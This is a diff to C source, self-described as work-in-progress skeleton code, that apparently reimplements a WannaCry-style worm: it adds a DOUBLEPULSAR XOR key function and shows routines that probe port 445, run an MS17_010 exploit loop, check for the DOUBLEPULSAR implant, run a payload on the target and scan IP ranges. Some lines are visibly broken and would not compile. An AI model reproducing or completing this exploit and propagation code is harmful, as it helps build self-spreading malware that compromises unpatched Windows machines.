@@ -1,6 +1,11 @@
 //skeleton code at this moment
 //still a work in progress
 
+unsigned int ComputerDOUBLEPULSARXorKey(unsigned int key)
+{
+	return 2 * key ^ ((((key >> 16) | key & 0xFF0000) >> 8) | (((key << 16) | key & 0xFF00) << 8));
+}
+
 //https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
 int canConnectToPort445(char *ip)
 {
@@ -109,7 +114,6 @@ int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
 
 DWORD MS17_010(DWORD LPPARAM)
 {
-
 	lpparam = (struct in_addr) ;
 	int attemptCount;
 	if ( tryFirstSetBuffers(&target, 445))
@@ -125,14 +129,14 @@ DWORD MS17_010(DWORD LPPARAM)
 		      	++attemptCount;
 		 } while ( attemptCount < 5 );
 	}
+	Sleep(3000);
 	if ( IsDOUBLEPULSARInstalled(&target, 1, 445))
 	{
-		runPayloadOnTarget(&target, 1, 445u);
+		runPayloadOnTarget(&target, 1, 445);
 	}
 	endthreadex(0);
 	return 0;
 }
-
 
 int scanIP(DWORD LPPARAM)
 {
@@ -147,7 +151,6 @@ int scanIP(DWORD LPPARAM)
 			}
 		}
 	}
-
 }
 
 int threadMain()
